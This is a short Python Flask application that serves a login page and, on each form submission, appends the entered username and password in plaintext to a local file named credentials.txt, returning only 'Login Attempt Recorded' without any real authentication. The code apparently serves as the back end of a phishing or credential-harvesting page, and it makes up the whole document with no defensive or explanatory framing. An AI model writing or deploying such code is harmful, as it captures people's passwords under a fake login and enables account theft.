from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')  # Serve the login page

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']  # Get username from the form
    password = request.form['password']  # Get password from the form
    # Save credentials to a file
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    return 'Login Attempt Recorded'  # Simple response for testing

if __name__ == '__main__':
    app.run(debug=True)
